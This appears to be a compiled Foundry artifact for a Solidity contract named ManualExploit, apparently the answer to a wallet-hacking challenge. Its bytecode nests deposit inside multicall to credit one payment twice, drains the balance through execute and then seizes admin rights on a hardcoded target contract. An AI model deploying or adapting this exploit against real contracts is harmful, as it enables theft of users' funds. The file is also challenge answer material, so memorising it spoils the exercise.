{"abi":[{"type":"receive","stateMutability":"payable"},{"type":"function","name":"step1_doubleDeposit","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"step2_withdraw","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"step3_setAdmin","inputs":[],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b506105f58061001c5f395ff3fe608060405260043610610036575f3560e01c80632bf75943146100415780637b5412a81461004b578063fb1b12451461005f575f5ffd5b3661003d57005b5f5ffd5b610049610073565b005b348015610056575f5ffd5b506100496102b7565b34801561006a575f5ffd5b506100496103bb565b6040805160048152602481018252602080820180516001600160e01b03167fd0e30db0000000000000000000000000000000000000000000000000000000001790528251600180825281850190945291925f929182015b60608152602001906001900390816100ca57905050905081815f815181106100f4576100f46104d7565b60200260200101819052505f816040516024016101119190610526565b60408051601f19818403018152918152602080830180516001600160e01b0316631592ca1b60e31b17905281516002808252606082019093529293505f92919082015b606081526020019060019003908161015457905050905083815f8151811061017e5761017e6104d7565b6020026020010181905250818160018151811061019d5761019d6104d7565b60200260200101819052505f73b7a5bd0345ef1cc5e66bf61bdec17d2461fbd96873ffffffffffffffffffffffffffffffffffffffff1634836040516024016101e69190610526565b60408051601f198184030181529181526020820180516001600160e01b0316631592ca1b60e31b1790525161021b91906105a4565b5f6040518083038185875af1925050503d805f8114610255576040519150601f19603f3d011682016040523d82523d5f602084013e61025a565b606091505b50509050806102b05760405162461bcd60e51b815260206004820152601060248201527f4d756c746963616c6c206661696c65640000000000000000000000000000000060448201526064015b60405180910390fd5b5050505050565b6040513360248201525f9073b7a5bd0345ef1cc5e66bf61bdec17d2461fbd9689060440160408051601f198184030181529181526020820180516001600160e01b03167f9d51d9b7000000000000000000000000000000000000000000000000000000001790525161032991906105a4565b5f604051808303815f865af19150503d805f8114610362576040519150601f19603f3d011682016040523d82523d5f602084013e610367565b606091505b50509050806103b85760405162461bcd60e51b815260206004820152601460248201527f7365744d617842616c616e6365206661696c656400000000000000000000000060448201526064016102a7565b50565b60405133602482015266071afd498d00006044820152606060648201525f608482018190529073b7a5bd0345ef1cc5e66bf61bdec17d2461fbd9689060a40160408051601f198184030181529181526020820180516001600160e01b03167fb61d27f6000000000000000000000000000000000000000000000000000000001790525161044891906105a4565b5f604051808303815f865af19150503d805f8114610481576040519150601f19603f3d011682016040523d82523d5f602084013e610486565b606091505b50509050806103b85760405162461bcd60e51b815260206004820152600e60248201527f45786563757465206661696c656400000000000000000000000000000000000060448201526064016102a7565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52603260045260245ffd5b5f5b8381101561051e578181015183820152602001610506565b50505f910152565b5f602082016020835280845180835260408501915060408160051b8601019250602086015f5b8281101561059857603f1987860301845281518051808752610575816020890160208501610504565b601f01601f1916959095016020908101955093840193919091019060010161054c565b50929695505050505050565b5f82516105b5818460208701610504565b919091019291505056fea2646970667358221220d4dfdca68b843bdc8226dddaad14795338d59365d022d6be7fe7700f230e9aaa64736f6c634300081c0033","sourceMap":"57:1560:0:-:0;;;;;;;;;;;;;;;;;;;","linkReferences":{}},"deployedBytecode":{"object":"0x608060405260043610610036575f3560e01c80632bf75943146100415780637b5412a81461004b578063fb1b12451461005f575f5ffd5b3661003d57005b5f5ffd5b610049610073565b005b348015610056575f5ffd5b506100496102b7565b34801561006a575f5ffd5b506100496103bb565b6040805160048152602481018252602080820180516001600160e01b03167fd0e30db0000000000000000000000000000000000000000000000000000000001790528251600180825281850190945291925f929182015b60608152602001906001900390816100ca57905050905081815f815181106100f4576100f46104d7565b60200260200101819052505f816040516024016101119190610526565b60408051601f19818403018152918152602080830180516001600160e01b0316631592ca1b60e31b17905281516002808252606082019093529293505f92919082015b606081526020019060019003908161015457905050905083815f8151811061017e5761017e6104d7565b6020026020010181905250818160018151811061019d5761019d6104d7565b60200260200101819052505f73b7a5bd0345ef1cc5e66bf61bdec17d2461fbd96873ffffffffffffffffffffffffffffffffffffffff1634836040516024016101e69190610526565b60408051601f198184030181529181526020820180516001600160e01b0316631592ca1b60e31b1790525161021b91906105a4565b5f6040518083038185875af1925050503d805f8114610255576040519150601f19603f3d011682016040523d82523d5f602084013e61025a565b606091505b50509050806102b05760405162461bcd60e51b815260206004820152601060248201527f4d756c746963616c6c206661696c65640000000000000000000000000000000060448201526064015b60405180910390fd5b5050505050565b6040513360248201525f9073b7a5bd0345ef1cc5e66bf61bdec17d2461fbd9689060440160408051601f198184030181529181526020820180516001600160e01b03167f9d51d9b7000000000000000000000000000000000000000000000000000000001790525161032991906105a4565b5f604051808303815f865af19150503d805f8114610362576040519150601f19603f3d011682016040523d82523d5f602084013e610367565b606091505b50509050806103b85760405162461bcd60e51b815260206004820152601460248201527f7365744d617842616c616e6365206661696c656400000000000000000000000060448201526064016102a7565b50565b60405133602482015266071afd498d00006044820152606060648201525f608482018190529073b7a5bd0345ef1cc5e66bf61bdec17d2461fbd9689060a40160408051601f198184030181529181526020820180516001600160e01b03167fb61d27f6000000000000000000000000000000000000000000000000000000001790525161044891906105a4565b5f604051808303815f865af19150503d805f8114610481576040519150601f19603f3d011682016040523d82523d5f602084013e610486565b606091505b50509050806103b85760405162461bcd60e51b815260206004820152600e60248201527f45786563757465206661696c656400000000000000000000000000000000000060448201526064016102a7565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52603260045260245ffd5b5f5b8381101561051e578181015183820152602001610506565b50505f910152565b5f602082016020835280845180835260408501915060408160051b8601019250602086015f5b8281101561059857603f1987860301845281518051808752610575816020890160208501610504565b601f01601f1916959095016020908101955093840193919091019060010161054c565b50929695505050505050565b5f82516105b5818460208701610504565b919091019291505056fea2646970667358221220d4dfdca68b843bdc8226dddaad14795338d59365d022d6be7fe7700f230e9aaa64736f6c634300081c0033","sourceMap":"57:1560:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;165:842;;;:::i;:::-;;1295:281;;;;;;;;;;;;;:::i;1017:268::-;;;;;;;;;;;;;:::i;165:842::-;288:36;;;;;;;;;;;;;;;;;-1:-1:-1;;;;;288:36:0;;;;;419:14;;431:1;419:14;;;;;;;;;288:36;;-1:-1:-1;;419:14:0;;;;;;;;;;;;;;;;;;;;391:42;;459:11;443:10;454:1;443:13;;;;;;;;:::i;:::-;;;;;;:27;;;;480;556:10;510:57;;;;;;;;:::i;:::-;;;;-1:-1:-1;;510:57:0;;;;;;;;;;;;;;;-1:-1:-1;;;;;510:57:0;-1:-1:-1;;;510:57:0;;;686:14;;698:1;686:14;;;;;;;;;510:57;;-1:-1:-1;;;686:14:0;698:1;686:14;;;;;;;;;;;;;;;;;;;658:42;;726:11;710:10;721:1;710:13;;;;;;;;:::i;:::-;;;;;;:27;;;;763:14;747:10;758:1;747:13;;;;;;;;:::i;:::-;;;;;;:30;;;;827:12;112:42;844:11;;863:9;933:10;887:57;;;;;;;;:::i;:::-;;;;-1:-1:-1;;887:57:0;;;;;;;;;;;;;;-1:-1:-1;;;;;887:57:0;-1:-1:-1;;;887:57:0;;;844:110;;;887:57;844:110;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;826:128;;;972:7;964:36;;;;-1:-1:-1;;;964:36:0;;2137:2:1;964:36:0;;;2119:21:1;2176:2;2156:18;;;2149:30;2215:18;2195;;;2188:46;2251:18;;964:36:0;;;;;;;;;213:794;;;;;165:842::o;1295:281::-;1430:79;;1496:10;1430:79;;;2426:25:1;1388:12:0;;112:42;;2399:18:1;;1430:79:0;;;-1:-1:-1;;1430:79:0;;;;;;;;;;;;;;-1:-1:-1;;;;;1430:79:0;;;;;1405:114;;;1430:79;1405:114;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1387:132;;;1537:7;1529:40;;;;-1:-1:-1;;;1529:40:0;;2664:2:1;1529:40:0;;;2646:21:1;2703:2;2683:18;;;2676:30;2742:22;2722:18;;;2715:50;2782:18;;1529:40:0;2462:344:1;1529:40:0;1330:246;1295:281::o;1017:268::-;1138:86;;1196:10;1138:86;;;3073:74:1;1208:11:0;3163:18:1;;;3156:57;3249:2;3229:18;;;3222:30;1096:12:0;3268:18:1;;;3261:29;;;1096:12:0;112:42;;3307:19:1;;1138:86:0;;;-1:-1:-1;;1138:86:0;;;;;;;;;;;;;;-1:-1:-1;;;;;1138:86:0;;;;;1113:121;;;1138:86;1113:121;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1095:139;;;1252:7;1244:34;;;;-1:-1:-1;;;1244:34:0;;3539:2:1;1244:34:0;;;3521:21:1;3578:2;3558:18;;;3551:30;3617:16;3597:18;;;3590:44;3651:18;;1244:34:0;3337:338:1;203:184;255:77;252:1;245:88;352:4;349:1;342:15;376:4;373:1;366:15;392:250;477:1;487:113;501:6;498:1;495:13;487:113;;;577:11;;;571:18;558:11;;;551:39;523:2;516:10;487:113;;;-1:-1:-1;;634:1:1;616:16;;609:27;392:250::o;647:991::-;807:4;855:2;844:9;840:18;885:2;874:9;867:21;908:6;943;937:13;974:6;966;959:22;1012:2;1001:9;997:18;990:25;;1074:2;1064:6;1061:1;1057:14;1046:9;1042:30;1038:39;1024:53;;1112:2;1104:6;1100:15;1133:1;1143:466;1157:6;1154:1;1151:13;1143:466;;;1250:2;1246:7;1234:9;1226:6;1222:22;1218:36;1213:3;1206:49;1284:6;1278:13;1326:2;1320:9;1357:8;1349:6;1342:24;1379:74;1444:8;1439:2;1431:6;1427:15;1422:2;1418;1414:11;1379:74;:::i;:::-;1519:2;1496:17;-1:-1:-1;;1492:31:1;1480:44;;;;1526:2;1476:53;;;;-1:-1:-1;1587:12:1;;;;1552:15;;;;;1179:1;1172:9;1143:466;;;-1:-1:-1;1626:6:1;;647:991;-1:-1:-1;;;;;;647:991:1:o;1643:287::-;1772:3;1810:6;1804:13;1826:66;1885:6;1880:3;1873:4;1865:6;1861:17;1826:66;:::i;:::-;1908:16;;;;;1643:287;-1:-1:-1;;1643:287:1:o","linkReferences":{}},"methodIdentifiers":{"step1_doubleDeposit()":"2bf75943","step2_withdraw()":"fb1b1245","step3_setAdmin()":"7b5412a8"},"rawMetadata":"{\"compiler\":{\"version\":\"0.8.28+commit.7893614a\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"step1_doubleDeposit\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"step2_withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"step3_setAdmin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"src/answers/ManualExploit.sol\":\"ManualExploit\"},\"evmVersion\":\"shanghai\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":1000},\"remappings\":[\":ds-test/=lib/openzeppelin-contracts-upgradeable/lib/forge-std/lib/ds-test/src/\",\":erc4626-tests/=lib/openzeppelin-contracts-upgradeable/lib/erc4626-tests/\",\":forge-std/=lib/forge-std/src/\",\":openzeppelin-contracts-06/=lib/openzeppelin-contracts-06/contracts/\",\":openzeppelin-contracts-08/=lib/openzeppelin-contracts-08/contracts/\",\":openzeppelin-contracts-upgradeable/=lib/openzeppelin-contracts-upgradeable/\",\":openzeppelin-upgradeable/=lib/openzeppelin-contracts-upgradeable/contracts/\",\":openzeppelin/=lib/openzeppelin-contracts-upgradeable/contracts/\"]},\"sources\":{\"src/answers/ManualExploit.sol\":{\"keccak256\":\"0xf151ef98c046dae686567c6bb10f1d8235718208b1ce7af685eefa2a7a220cdb\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://492f5dddd33eb0c1216cbe0d3c1d6f4fad64535397fbaa9c6945ecc23d4fc947\",\"dweb:/ipfs/QmeZmtG7NwpXNMu84p77aGuCDkSXuCeBDip2WczqVnbZuT\"]}},\"version\":1}","metadata":{"compiler":{"version":"0.8.28+commit.7893614a"},"language":"Solidity","output":{"abi":[{"inputs":[],"stateMutability":"payable","type":"function","name":"step1_doubleDeposit"},{"inputs":[],"stateMutability":"nonpayable","type":"function","name":"step2_withdraw"},{"inputs":[],"stateMutability":"nonpayable","type":"function","name":"step3_setAdmin"},{"inputs":[],"stateMutability":"payable","type":"receive"}],"devdoc":{"kind":"dev","methods":{},"version":1},"userdoc":{"kind":"user","methods":{},"version":1}},"settings":{"remappings":["ds-test/=lib/openzeppelin-contracts-upgradeable/lib/forge-std/lib/ds-test/src/","erc4626-tests/=lib/openzeppelin-contracts-upgradeable/lib/erc4626-tests/","forge-std/=lib/forge-std/src/","openzeppelin-contracts-06/=lib/openzeppelin-contracts-06/contracts/","openzeppelin-contracts-08/=lib/openzeppelin-contracts-08/contracts/","openzeppelin-contracts-upgradeable/=lib/openzeppelin-contracts-upgradeable/","openzeppelin-upgradeable/=lib/openzeppelin-contracts-upgradeable/contracts/","openzeppelin/=lib/openzeppelin-contracts-upgradeable/contracts/"],"optimizer":{"enabled":true,"runs":1000},"metadata":{"bytecodeHash":"ipfs"},"compilationTarget":{"src/answers/ManualExploit.sol":"ManualExploit"},"evmVersion":"shanghai","libraries":{}},"sources":{"src/answers/ManualExploit.sol":{"keccak256":"0xf151ef98c046dae686567c6bb10f1d8235718208b1ce7af685eefa2a7a220cdb","urls":["bzz-raw://492f5dddd33eb0c1216cbe0d3c1d6f4fad64535397fbaa9c6945ecc23d4fc947","dweb:/ipfs/QmeZmtG7NwpXNMu84p77aGuCDkSXuCeBDip2WczqVnbZuT"],"license":"MIT"}},"version":1},"id":0}